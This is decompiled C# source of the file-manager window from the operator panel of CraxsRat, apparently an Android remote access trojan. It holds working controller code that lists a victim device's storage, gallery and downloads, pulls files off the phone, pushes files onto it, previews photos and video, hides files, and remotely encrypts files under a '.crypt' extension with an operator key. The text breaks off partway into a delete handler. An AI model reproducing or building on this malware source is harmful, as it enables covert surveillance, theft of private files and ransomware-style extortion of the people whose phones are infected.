using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;

// Token: 0x02000075 RID: 117
[DesignerGenerated]
public partial class FileManager : Form
{
	// Token: 0x06000563 RID: 1379 RVA: 0x00085C68 File Offset: 0x00083E68
	public FileManager()
	{
		base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca;
		base.FormClosing += this.FileManager_FormClosing;
		this.Title = "null";
		this.ver = "n/a";
		this.Correntindex = -1;
		this.paths_indexs = new Collection();
		this.FSize = "Large text editing is not allowed {1}  -->{0}";
		this.Q = "20";
		this.ShowVideo = false;
		this.DownStreams = new Collection();
		this.FileDirectory = reso.res_Path + "\\Thumbs";
		this.Clipboard = new List<Array>();
		this.isfront = false;
		this.tempImage = new PictureBox();
		this.searchbefore = new List<DataGridViewRow>();
		this.InitializeComponent();
	}

	// Token: 0x06000566 RID: 1382 RVA: 0x0000206C File Offset: 0x0000026C
	private void SpyStyle()
	{
	}

	// Token: 0x06000567 RID: 1383 RVA: 0x00089BDC File Offset: 0x00087DDC
	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.cancelbtn.Text = "停止";
				this.cancelbtn.Text = "清除";
				this.Downpic.Text = "下载";
				this.sdbtn.Text = "SD卡";
				this.dcmbtn.Text = "画廊";
				this.picbtn.Text = "图片";
				this.ThumbsCont.Text = "以前见过的使用";
				this.DGV0.Columns[0].HeaderText = "类型";
				this.DGV0.Columns[1].HeaderText = "姓名";
				this.DGV0.Columns[2].HeaderText = "尺寸";
				this.DGV0.Columns[3].HeaderText = "修改日期";
				this.DGV0.Columns[4].HeaderText = "创建日期";
				this.ctxMenu.Items[0].Text = "打开";
				this.ctxMenu.Items[1].Text = "复制";
				this.ctxMenu.Items[2].Text = "切";
				this.ctxMenu.Items[3].Text = "粘贴";
				this.ctxMenu.Items[4].Text = "下载";
				this.ctxMenu.Items[5].Text = "上传";
				this.ctxMenu.Items[6].Text = "加密";
				this.ctxMenu.Items[7].Text = "解密";
				this.ctxMenu.Items[8].Text = "压缩";
				this.ctxMenu.Items[9].Text = "解压";
				this.ctxMenu.Items[10].Text = "删除";
				this.ctxMenu.Items[11].Text = "创建文件";
				this.ctxMenu.Items[12].Text = "改名";
				this.ctxMenu.Items[13].Text = "编辑";
				this.ctxMenu.Items[14].Text = "隐藏";
				this.ctxMenu.Items[15].Text = "取消隐藏";
				this.ctxMenu.Items[16].Text = "设置为墙纸";
				this.ctxMenu.Items[17].Text = "播放声音";
				this.ctxMenu.Items[18].Text = "下载";
			}
		}
		else
		{
			this.cancelbtn.Text = "إيقاف";
			this.cancelbtn.Text = "حذف";
			this.Downpic.Text = "التحميلات";
			this.sdbtn.Text = "زاكرة الهاتف";
			this.dcmbtn.Text = "المعرض";
			this.picbtn.Text = "الصور";
			this.ThumbsCont.Text = "عرض من المحمل مسبقا";
			this.DGV0.Columns[0].HeaderText = "النوع";
			this.DGV0.Columns[1].HeaderText = "الأسم";
			this.DGV0.Columns[2].HeaderText = "الحجم";
			this.DGV0.Columns[3].HeaderText = "تاريخ التعديل";
			this.DGV0.Columns[4].HeaderText = "تاريخ الأنشاء";
			this.ctxMenu.Items[0].Text = "فتح";
			this.ctxMenu.Items[1].Text = "نسخ";
			this.ctxMenu.Items[2].Text = "قص";
			this.ctxMenu.Items[3].Text = "لصق";
			this.ctxMenu.Items[4].Text = "تحميل";
			this.ctxMenu.Items[5].Text = "إرسال ملف";
			this.ctxMenu.Items[6].Text = "تشفير";
			this.ctxMenu.Items[7].Text = "فك التشفير";
			this.ctxMenu.Items[8].Text = "ضغط";
			this.ctxMenu.Items[9].Text = "فك الضغط";
			this.ctxMenu.Items[10].Text = "حذف";
			this.ctxMenu.Items[11].Text = "إنشاء ملف";
			this.ctxMenu.Items[12].Text = "إعادة تسمية";
			this.ctxMenu.Items[13].Text = "تعديل";
			this.ctxMenu.Items[14].Text = "إخفاء";
			this.ctxMenu.Items[15].Text = "إظهار";
			this.ctxMenu.Items[16].Text = "تعين كخلفية الهاتف";
			this.ctxMenu.Items[17].Text = "تشغيل مقطع صوتي";
			this.ctxMenu.Items[18].Text = "التحميلات";
		}
	}

	// Token: 0x06000568 RID: 1384 RVA: 0x0008A220 File Offset: 0x00088420
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca(object sender, EventArgs e)
	{
		base.SetStyle(ControlStyles.UserPaint | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
		base.ActiveControl = this.DGV0;
		base.Tag = "File" + this.classClient.UUID;
		this.Timer1.Start();
		this.Q = Convert.ToString(MySettingsProperty.Settings.ImageQualty);
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\9.ico");
		this.usrscreen.Image = reso.GetScreen(this.classClient.Screen);
		this.CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax();
		this.Timer2.Start();
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		this.Text = this.Title;
		try
		{
			if (this.classClient.Row == null)
			{
			}
		}
		catch (Exception)
		{
		}
		this.Label1.Text = " ";
		this.OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.OpenToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\open.png");
		this.OpenToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.DownloadToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\download.png");
		this.DownloadToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.UploadToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\upload.png");
		this.UploadToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.EncryptToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\encrypt.png");
		this.EncryptToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.DecodeToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\decode.png");
		this.DecodeToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.ZipToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\zip.png");
		this.ZipToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.UnZipToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\unzip.png");
		this.UnZipToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.DeleteToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\delete.png");
		this.DeleteToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.AddFilesToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\add.png");
		this.AddFilesToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.RenameToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\rename.png");
		this.RenameToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.EditToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\edit.png");
		this.EditToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.HideToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\hidden.png");
		this.HideToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.ShowToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\show.png");
		this.ShowToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.FolderDownloadsToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\downloads.png");
		this.FolderDownloadsToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.CutToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\cut.png");
		this.CutToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.CopyToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\copy.png");
		this.CopyToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.PasteToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\paste.png");
		this.PasteToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.SetWallpaperToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\wallpaper.png");
		this.SetWallpaperToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
		this.PlaySoundToolStripMenuItem.Image = new Bitmap(reso.res_Path + "\\Icons\\Menu_Items\\17\\playsound.png");
		this.PlaySoundToolStripMenuItem.Tag = new object[]
		{
			0,
			"null",
			"null"
		};
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
	}

	// Token: 0x06000569 RID: 1385 RVA: 0x0008A99C File Offset: 0x00088B9C
	private void DGV0_SortCompare(object sender, DataGridViewSortCompareEventArgs e)
	{
		if (e.RowIndex1 == 0)
		{
			e.Handled = true;
		}
	}

	// Token: 0x0600056A RID: 1386 RVA: 0x0008A9BC File Offset: 0x00088BBC
	private void DGV0_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
	{
		try
		{
			string text = this.DGV0.CurrentRow.Index.ToString();
			string text2 = this.pathtxt.Text;
			if (!this.paths_indexs.Contains(text2))
			{
				this.paths_indexs.Add(new object[]
				{
					text
				}, text2, null, null);
				this.Correntindex = this.DGV0.CurrentRow.Index;
			}
			else
			{
				object[] array = (object[])this.paths_indexs[text2];
				string left = Conversions.ToString(array[0]);
				if (Operators.CompareString(left, this.DGV0.CurrentRow.Index.ToString(), false) != 0)
				{
					this.Correntindex = this.DGV0.CurrentRow.Index;
				}
			}
		}
		catch (Exception)
		{
		}
		if (e.RowIndex > 0 && e.ColumnIndex >= 0)
		{
			if (Operators.ConditionalCompareObjectEqual(this.DGV0.Rows[e.RowIndex].Cells[0].Tag, "0", false))
			{
				if (this.classClient != null)
				{
					object[] parametersObjects = new object[]
					{
						this.Client,
						Operators.ConcatenateObject(string.Concat(new string[]
						{
							SecurityKey.KeysClient1,
							Data.SPL_SOCKET,
							reso.domen,
							".files",
							Data.SPL_SOCKET,
							"method",
							Data.SPL_SOCKET,
							SecurityKey.getfiles,
							Data.SPL_SOCKET,
							"files",
							Data.SPL_DATA
						}), this.Pnext(Conversions.ToString(this.DGV0.Tag), Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value))),
						Codes.Encoding().GetBytes("null"),
						this.classClient
					};
					this.classClient.SendMessage(parametersObjects);
				}
			}
			else
			{
				string text3 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[e.RowIndex].Cells[1].Value));
				string left2 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[0].Tag);
				string text4 = Conversions.ToString(this.DGV0.Rows[e.RowIndex].Cells[1].Value);
				if (Operators.CompareString(left2, "1", false) == 0)
				{
					if (this.ISupportedText(text4.ToLower()))
					{
						object objectValue = RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Tag);
						if (!Operators.ConditionalCompareObjectLessEqual(objectValue, 512000, false))
						{
							Interaction.MsgBox(string.Format(this.FSize, RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[2].Value), RuntimeHelpers.GetObjectValue(this.DGV0.Rows[e.RowIndex].Cells[1].Value)), MsgBoxStyle.Critical, reso.nameRAT);
						}
						else if (this.classClient != null)
						{
							object[] parametersObjects2 = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.editor,
									Data.SPL_SOCKET,
									"edit",
									Data.SPL_DATA,
									text3
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects2);
						}
					}
					else
					{
						object obj = this.ISupportedImages(text4.ToLower()) ? "false" : ((!this.ISupportedVideo(text4.ToLower())) ? "null" : "true");
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
						{
							string[] array2 = this.classClient.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects3 = new object[]
							{
								this.Client,
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"small",
									Data.SPL_DATA,
									array2[0],
									Data.SPL_DATA,
									array2[1],
									Data.SPL_DATA,
									text3,
									Data.SPL_DATA
								}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects3);
						}
					}
				}
			}
		}
		else if (e.RowIndex == 0 && e.ColumnIndex >= 0 && this.classClient != null)
		{
			object[] parametersObjects4 = new object[]
			{
				this.Client,
				Operators.ConcatenateObject(string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA
				}), this.Pback(Conversions.ToString(this.DGV0.Tag))),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects4);
		}
	}

	// Token: 0x0600056B RID: 1387 RVA: 0x0008B0AC File Offset: 0x000892AC
	private object Pback(string p)
	{
		string text = string.Format("{0}", p.Substring(0, p.LastIndexOf("/")));
		return text.Contains("/") ? text : "/";
	}

	// Token: 0x0600056C RID: 1388 RVA: 0x0008B0F0 File Offset: 0x000892F0
	private object Pnext(string p, string n)
	{
		return p + "/" + n;
	}

	// Token: 0x0600056D RID: 1389 RVA: 0x0008B10C File Offset: 0x0008930C
	private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (this.classClient != null)
						{
							string[] array = this.classClient.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"download",
									Data.SPL_DATA,
									array[0],
									Data.SPL_DATA,
									array[1],
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									SecurityKey.down_info,
									Data.SPL_DATA,
									SecurityKey.downByte,
									"File",
									this.classClient.UUID,
									Data.SPL_DATA,
									"File",
									this.classClient.UUID
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x0600056E RID: 1390 RVA: 0x0008B358 File Offset: 0x00089558
	private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			this.FilesUpload.Title = "Please select Files";
			this.FilesUpload.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			this.FilesUpload.Filter = "all Files|*.*";
			this.FilesUpload.FileName = string.Empty;
			this.FilesUpload.Multiselect = true;
			if (this.FilesUpload.ShowDialog() == DialogResult.OK && this.classClient != null)
			{
				string[] fileNames = this.FilesUpload.FileNames;
				if (fileNames.Length != 0)
				{
					string[] array = fileNames;
					foreach (string fileName in array)
					{
						string[] array3 = this.classClient.Keys.Split(new char[]
						{
							':'
						});
						try
						{
							FileInfo fileInfo = new FileInfo(fileName);
							string text = Conversions.ToString(fileInfo.Length);
							string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), fileInfo.Name));
							string name = fileInfo.Name;
							string fullName = fileInfo.FullName;
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"upload",
									Data.SPL_DATA,
									array3[0],
									Data.SPL_DATA,
									array3[1],
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									name,
									Data.SPL_DATA,
									fullName,
									Data.SPL_DATA,
									SecurityKey.upload_info,
									Data.SPL_DATA,
									SecurityKey.uploadByte
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}
	}

	// Token: 0x0600056F RID: 1391 RVA: 0x0008B5C4 File Offset: 0x000897C4
	private void ViewToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(left, "1", false) == 0)
					{
						string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						string text2 = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value);
						object obj = this.ISupportedImages(text2.ToLower()) ? "false" : ((!this.ISupportedVideo(text2.ToLower())) ? "null" : "true");
						if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(obj, "null", false))) && this.classClient != null)
						{
							string[] array = this.classClient.Keys.Split(new char[]
							{
								':'
							});
							object[] parametersObjects = new object[]
							{
								this.Client,
								Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"small",
									Data.SPL_DATA,
									array[0],
									Data.SPL_DATA,
									array[1],
									Data.SPL_DATA,
									text,
									Data.SPL_DATA
								}), obj), Data.SPL_DATA), this.Q), Data.SPL_DATA), SecurityKey.ImageViewer), "File" + this.classClient.UUID),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
			}
		}
	}

	// Token: 0x06000570 RID: 1392 RVA: 0x0008B898 File Offset: 0x00089A98
	private void ExternalStorageDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get0"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000571 RID: 1393 RVA: 0x0008B95C File Offset: 0x00089B5C
	private void DirectoryDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get1"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000572 RID: 1394 RVA: 0x0008BA20 File Offset: 0x00089C20
	private void DirectoryPicturesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get2"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000573 RID: 1395 RVA: 0x0008BAE4 File Offset: 0x00089CE4
	private void DirectoryDCIMToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					"get3"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x06000574 RID: 1396 RVA: 0x0008BBA8 File Offset: 0x00089DA8
	private void CustomToolStripMenuItem_Click(object sender, EventArgs e)
	{
		inp inp = new inp();
		inp.Text = "Access Path";
		inp.LTitle.Text = "Add path";
		inp.InputText.Text = ((this.DGV0.Tag.ToString().Length == 0) ? "/" : this.DGV0.Tag.ToString());
		inp.StartPosition = FormStartPosition.Manual;
		inp.Location = Codes.FixSize(this, inp);
		DialogResult dialogResult = inp.ShowDialog(this);
		if (dialogResult == DialogResult.OK && this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".files",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getfiles,
					Data.SPL_SOCKET,
					"files",
					Data.SPL_DATA,
					inp.InputText.Text
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
		inp.Close();
	}

	// Token: 0x06000575 RID: 1397 RVA: 0x0008BCF8 File Offset: 0x00089EF8
	private void FolderDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			string text = this.classClient.FolderUSER + "\\Downloads";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
		}
	}

	// Token: 0x06000576 RID: 1398 RVA: 0x0008BD40 File Offset: 0x00089F40
	private void DecodeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.classClient != null)
			{
				inp inp = new inp();
				inp.Text = "decryption";
				inp.LTitle.Text = "Add decryption key";
				inp.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
				inp.StartPosition = FormStartPosition.Manual;
				inp.Location = Codes.FixSize(this, inp);
				DialogResult dialogResult = inp.ShowDialog(this);
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							string value = ".crypt";
							string text2;
							if (text.EndsWith(value))
							{
								int length = text.LastIndexOf(value);
								text2 = text.Substring(0, length);
							}
							else
							{
								text2 = text + ".decrypt";
							}
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"decrypt",
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									inp.InputText.Text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
						}
					}
				}
				inp.Close();
			}
		}
	}

	// Token: 0x06000577 RID: 1399 RVA: 0x0008BFC0 File Offset: 0x0008A1C0
	private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.classClient != null)
			{
				inp inp = new inp();
				inp.Text = "encryption";
				inp.LTitle.Text = "Add encryption key";
				inp.InputText.Text = MySettingsProperty.Settings.EncryptionKey;
				inp.StartPosition = FormStartPosition.Manual;
				inp.Location = Codes.FixSize(this, inp);
				DialogResult dialogResult = inp.ShowDialog(this);
				if (dialogResult == DialogResult.OK && this.classClient != null && this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string left = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
						if (Operators.CompareString(left, "1", false) == 0)
						{
							string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
							object[] parametersObjects = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"encrypt",
									Data.SPL_DATA,
									text,
									Data.SPL_DATA,
									".crypt",
									Data.SPL_DATA,
									inp.InputText.Text
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(parametersObjects);
							MySettingsProperty.Settings.EncryptionKey = inp.InputText.Text;
							MySettingsProperty.Settings.Save();
						}
					}
				}
				inp.Close();
			}
		}
	}

	// Token: 0x06000578 RID: 1400 RVA: 0x0008C228 File Offset: 0x0008A428
	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
